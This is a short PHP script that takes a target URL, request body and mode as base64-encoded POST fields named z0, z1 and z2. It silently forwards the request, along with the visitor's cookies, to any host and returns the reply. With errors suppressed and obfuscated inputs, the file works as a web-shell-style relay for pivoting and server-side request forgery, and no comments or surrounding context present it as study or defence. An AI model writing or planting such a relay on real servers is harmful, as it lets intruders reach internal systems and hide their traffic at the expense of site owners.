<?php

error_reporting(0);
header('Content-Type: text/plain');

function is_binary($data) {
    if (preg_match('~[^\x20-\x7E\t\r\n]~', $data)) {
        return true;
    }
    return false;
}

function http_post($url, $data, &$http_code, $mode)
{
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HEADER, true);

    if ($mode == 'binary') {
        $content_type = 'Content-Type: application/octet-stream';
        curl_setopt($ch, CURLOPT_POSTFIELDS, base64_decode($data)); 
    } else {
        $content_type = 'Content-Type: application/x-www-form-urlencoded';
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data); 
    }

    $headers = [
        $content_type,
    ];

    if (isset($_SERVER['HTTP_COOKIE'])) {
        $headers[] = 'Cookie: ' . $_SERVER['HTTP_COOKIE'];
    }

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);

    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    
    $header_content = substr($response, 0, $header_size);
    $body = substr($response, $header_size);

    foreach (explode("\r\n", $header_content) as $header) {
        if (stripos($header, 'Set-Cookie:') === 0) {
            header($header, false);
        }
    }

    curl_close($ch);

    if ($mode == 'binary') {
        $body = base64_encode($body);
    }

    return $body;
}

$url  = base64_decode($_POST['z0']);
$data = base64_decode($_POST['z1']);
$mode = base64_decode($_POST['z2']);

$http_code = 0;
$body = http_post($url, $data, $http_code, $mode);

echo($body);

?>